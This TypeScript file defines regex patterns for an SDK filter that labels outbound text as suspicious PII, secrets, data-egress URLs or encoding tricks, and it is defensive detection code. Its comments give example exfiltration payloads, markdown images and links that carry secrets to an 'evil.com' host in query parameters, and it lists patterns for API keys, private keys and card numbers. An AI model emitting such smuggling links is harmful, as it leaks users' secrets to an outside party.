/**
 * PII Pattern
 * Domain value object: immutable pattern definitions for Layer 1 outbound filtering.
 *
 * The SDK is a HIGH-PRECISION SENSOR. It does not guess the developer's intent.
 * Every match is labeled SUSPICIOUS with a specific SuspiciousLabel.
 * The developer decides the reaction: redact, block, or audit.
 *
 * The "Suspicious" Manifest:
 * ┌──────────────────┬────────────────────────┬───────────────────────┐
 * │ Trigger          │ Label                  │ Developer's Action    │
 * ├──────────────────┼────────────────────────┼───────────────────────┤
 * │ Email / Phone    │ SUSPICIOUS_PII         │ Usually Redact        │
 * │ API / SSH Keys   │ SUSPICIOUS_SECRET      │ Usually Block         │
 * │ External URL     │ SUSPICIOUS_EGRESS      │ Always Block          │
 * │ ASCII / Unicode  │ SUSPICIOUS_ENCODING    │ Audit / Block         │
 * └──────────────────┴────────────────────────┴───────────────────────┘
 *
 * All regex patterns carry the global flag so String.replace replaces every match.
 */

export type PIICategory =
  | "email"
  | "phone"
  | "credit_card"
  | "ssn"
  | "api_key"
  | "ssh_private_key"
  | "egress_url_smuggling"
  | "egress_credential_url"
  | "egress_base64_url"
  | "encoding_zero_width"
  | "encoding_direction_override"
  | "encoding_base64_blob";

/**
 * Semantic label surfaced on every SuspiciousTrace.
 * Maps directly to the "Suspicious Manifest" table — developer uses this to route decisions.
 */
export type SuspiciousLabel =
  | "SUSPICIOUS_PII"       // Email, phone — usually redact
  | "SUSPICIOUS_SECRET"    // API keys, SSH, credit cards, SSN — usually block
  | "SUSPICIOUS_EGRESS"    // Unauthorized external URLs — always block
  | "SUSPICIOUS_ENCODING"; // ASCII/Unicode obfuscation — audit / block

/** Maps each category to its semantic label */
export const CATEGORY_TO_LABEL: Readonly<Record<PIICategory, SuspiciousLabel>> = {
  email:                      "SUSPICIOUS_PII",
  phone:                      "SUSPICIOUS_PII",
  credit_card:                "SUSPICIOUS_SECRET",
  ssn:                        "SUSPICIOUS_SECRET",
  api_key:                    "SUSPICIOUS_SECRET",
  ssh_private_key:            "SUSPICIOUS_SECRET",
  egress_url_smuggling:       "SUSPICIOUS_EGRESS",
  egress_credential_url:      "SUSPICIOUS_EGRESS",
  egress_base64_url:          "SUSPICIOUS_EGRESS",
  encoding_zero_width:        "SUSPICIOUS_ENCODING",
  encoding_direction_override:"SUSPICIOUS_ENCODING",
  encoding_base64_blob:       "SUSPICIOUS_ENCODING",
};

/** Priority order for label escalation (highest wins when multiple labels fire) */
export const LABEL_PRIORITY: Readonly<Record<SuspiciousLabel, number>> = {
  SUSPICIOUS_EGRESS:   3,
  SUSPICIOUS_SECRET:   2,
  SUSPICIOUS_ENCODING: 1,
  SUSPICIOUS_PII:      0,
};

export interface PIIPattern {
  readonly id: string;
  readonly name: string;
  /** Must carry the global flag — String.replace relies on it */
  readonly pattern: RegExp;
  readonly category: PIICategory;
  /** Token to substitute in the pre-computed redactedContent */
  readonly redactAs: string;
}

// ─── SUSPICIOUS_EGRESS ────────────────────────────────────────────────────────

const EGRESS_PATTERNS: readonly PIIPattern[] = [
  {
    id: "pii-egress-001",
    name: "Markdown Image with URL Query Params (Data Smuggling)",
    // ![x](https://evil.com/log.png?config={"db_pass":"secret"})
    pattern: /!\[[^\]]*\]\(https?:\/\/[^\s)]*\?[^\s)]+\)/gi,
    category: "egress_url_smuggling",
    redactAs: "[SUSPICIOUS_EGRESS:MARKDOWN_IMAGE_SMUGGLING]",
  },
  {
    id: "pii-egress-002",
    name: "Markdown Link with URL Query Params (Data Smuggling)",
    // [click](https://evil.com?data=secret)
    pattern: /(?<!!)\[[^\]]*\]\(https?:\/\/[^\s)]*\?[^\s)]+\)/gi,
    category: "egress_url_smuggling",
    redactAs: "[SUSPICIOUS_EGRESS:MARKDOWN_LINK_SMUGGLING]",
  },
  {
    id: "pii-egress-003",
    name: "Credential-Embedded URL",
    // https://user:password@hostname
    pattern: /https?:\/\/[A-Za-z0-9._%-]+:[A-Za-z0-9._~!$&'()*+,;=%-]+@[A-Za-z0-9.-]+/gi,
    category: "egress_credential_url",
    redactAs: "[SUSPICIOUS_EGRESS:CREDENTIAL_URL]",
  },
  {
    id: "pii-egress-004",
    name: "Base64 Blob in URL Parameter",
    // ?param=<80+ base64 chars> — encodes data for exfiltration via tracking pixels
    pattern: /[?&][A-Za-z0-9_%-]+=(?:[A-Za-z0-9+/]{80,}={0,2})/g,
    category: "egress_base64_url",
    redactAs: "[SUSPICIOUS_EGRESS:BASE64_URL_PAYLOAD]",
  },
];

// ─── SUSPICIOUS_ENCODING ──────────────────────────────────────────────────────

const ENCODING_PATTERNS: readonly PIIPattern[] = [
  {
    id: "pii-enc-001",
    name: "Zero-Width Characters",
    // Invisible Unicode used to watermark, fingerprint, or smuggle hidden data
    pattern: /[\u200B\u200C\u200D\uFEFF\u2060]+/g,
    category: "encoding_zero_width",
    redactAs: "[SUSPICIOUS_ENCODING:ZERO_WIDTH_CHARS]",
  },
  {
    id: "pii-enc-002",
    name: "Unicode Bidirectional Override",
    // LRE/RLE/PDF/LRO/RLO and newer isolate/pop chars — used to reverse text visually
    pattern: /[\u202A-\u202E\u2066-\u2069]+/g,
    category: "encoding_direction_override",
    redactAs: "[SUSPICIOUS_ENCODING:BIDI_OVERRIDE]",
  },
  {
    id: "pii-enc-003",
    name: "Standalone Base64 Blob (≥120 chars)",
    // A large base64 block outside of a URL — likely encoded payload or data exfil
    pattern: /(?<![A-Za-z0-9+/])(?:[A-Za-z0-9+/]{4}){30,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?(?![A-Za-z0-9+/=])/g,
    category: "encoding_base64_blob",
    redactAs: "[SUSPICIOUS_ENCODING:BASE64_BLOB]",
  },
];

// ─── SUSPICIOUS_SECRET ────────────────────────────────────────────────────────

const SECRET_PATTERNS: readonly PIIPattern[] = [
  {
    id: "pii-ssh-001",
    name: "SSH/PEM Private Key Block",
    pattern: /-----BEGIN (?:RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----[\s\S]*?-----END (?:RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----/gi,
    category: "ssh_private_key",
    redactAs: "[SUSPICIOUS_SECRET:SSH_PRIVATE_KEY]",
  },
  {
    id: "pii-apikey-001",
    name: "Anthropic API Key",
    pattern: /sk-ant-api0[0-9]+-[A-Za-z0-9_-]{32,}/g,
    category: "api_key",
    redactAs: "[SUSPICIOUS_SECRET:ANTHROPIC_API_KEY]",
  },
  {
    id: "pii-apikey-002",
    name: "OpenAI API Key",
    pattern: /sk-(?:proj-)?[A-Za-z0-9]{32,}/g,
    category: "api_key",
    redactAs: "[SUSPICIOUS_SECRET:OPENAI_API_KEY]",
  },
  {
    id: "pii-apikey-003",
    name: "Stripe Live Secret Key",
    pattern: /sk_live_[A-Za-z0-9]{24,}/g,
    category: "api_key",
    redactAs: "[SUSPICIOUS_SECRET:STRIPE_SECRET_KEY]",
  },
  {
    id: "pii-apikey-004",
    name: "Stripe Live Restricted Key",
    pattern: /rk_live_[A-Za-z0-9]{24,}/g,
    category: "api_key",
    redactAs: "[SUSPICIOUS_SECRET:STRIPE_RESTRICTED_KEY]",
  },
  {
    id: "pii-apikey-005",
    name: "GitHub Personal Access Token (classic)",
    pattern: /ghp_[A-Za-z0-9]{36}/g,
    category: "api_key",
    redactAs: "[SUSPICIOUS_SECRET:GITHUB_TOKEN]",
  },
  {
    id: "pii-apikey-006",
    name: "GitHub Personal Access Token (fine-grained)",
    pattern: /github_pat_[A-Za-z0-9_]{82}/g,
    category: "api_key",
    redactAs: "[SUSPICIOUS_SECRET:GITHUB_TOKEN]",
  },
  {
    id: "pii-apikey-007",
    name: "AWS Access Key ID",
    pattern: /\bAKIA[0-9A-Z]{16}\b/g,
    category: "api_key",
    redactAs: "[SUSPICIOUS_SECRET:AWS_ACCESS_KEY]",
  },
  {
    id: "pii-apikey-008",
    name: "Google API Key",
    pattern: /\bAIza[0-9A-Za-z_-]{35}\b/g,
    category: "api_key",
    redactAs: "[SUSPICIOUS_SECRET:GOOGLE_API_KEY]",
  },
  {
    id: "pii-apikey-009",
    name: "Slack Token",
    pattern: /\bxox[baprs]-[0-9A-Za-z-]{10,}\b/g,
    category: "api_key",
    redactAs: "[SUSPICIOUS_SECRET:SLACK_TOKEN]",
  },
  {
    id: "pii-apikey-010",
    name: "SendGrid API Key",
    pattern: /\bSG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}\b/g,
    category: "api_key",
    redactAs: "[SUSPICIOUS_SECRET:SENDGRID_API_KEY]",
  },
  {
    id: "pii-apikey-011",
    name: "Twilio API Key",
    pattern: /\bSK[0-9a-fA-F]{32}\b/g,
    category: "api_key",
    redactAs: "[SUSPICIOUS_SECRET:TWILIO_API_KEY]",
  },
  {
    id: "pii-cc-001",
    name: "Visa Card Number",
    pattern: /\b4[0-9]{3}[- ]?[0-9]{4}[- ]?[0-9]{4}[- ]?[0-9]{4}\b/g,
    category: "credit_card",
    redactAs: "[SUSPICIOUS_SECRET:CREDIT_CARD]",
  },
  {
    id: "pii-cc-002",
    name: "Mastercard Number",
    pattern: /\b(?:5[1-5][0-9]{2}|222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720)[- ]?[0-9]{4}[- ]?[0-9]{4}[- ]?[0-9]{4}\b/g,
    category: "credit_card",
    redactAs: "[SUSPICIOUS_SECRET:CREDIT_CARD]",
  },
  {
    id: "pii-cc-003",
    name: "Amex Card Number",
    pattern: /\b3[47][0-9]{2}[- ]?[0-9]{6}[- ]?[0-9]{5}\b/g,
    category: "credit_card",
    redactAs: "[SUSPICIOUS_SECRET:CREDIT_CARD]",
  },
  {
    id: "pii-cc-004",
    name: "Discover Card Number",
    pattern: /\b6(?:011|5[0-9]{2})[- ]?[0-9]{4}[- ]?[0-9]{4}[- ]?[0-9]{4}\b/g,
    category: "credit_card",
    redactAs: "[SUSPICIOUS_SECRET:CREDIT_CARD]",
  },
  {
    id: "pii-ssn-001",
    name: "US Social Security Number",
    pattern: /(?<!\d)\d{3}-\d{2}-\d{4}(?!\d)/g,
    category: "ssn",
    redactAs: "[SUSPICIOUS_SECRET:SSN]",
  },
];

// ─── SUSPICIOUS_PII ───────────────────────────────────────────────────────────

const PII_PATTERNS_LOW: readonly PIIPattern[] = [
  {
    id: "pii-email-001",
    name: "Email Address",
    pattern: /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b/g,
    category: "email",
    redactAs: "[SUSPICIOUS_PII:EMAIL]",
  },
  {
    id: "pii-phone-001",
    name: "US Phone Number",
    pattern: /(?<!\d)(?:\+1[-.\s]?)?\(?[2-9][0-9]{2}\)?[-.\s][0-9]{3}[-.\s][0-9]{4}(?!\d)/g,
    category: "phone",
    redactAs: "[SUSPICIOUS_PII:PHONE]",
  },
];

// ─── Canonical ordered set ────────────────────────────────────────────────────
// Scan order: EGRESS → ENCODING → SECRET → PII
// Highest-severity patterns first so the label reflects the worst finding.

export const PII_PATTERNS: readonly PIIPattern[] = [
  ...EGRESS_PATTERNS,
  ...ENCODING_PATTERNS,
  ...SECRET_PATTERNS,
  ...PII_PATTERNS_LOW,
];
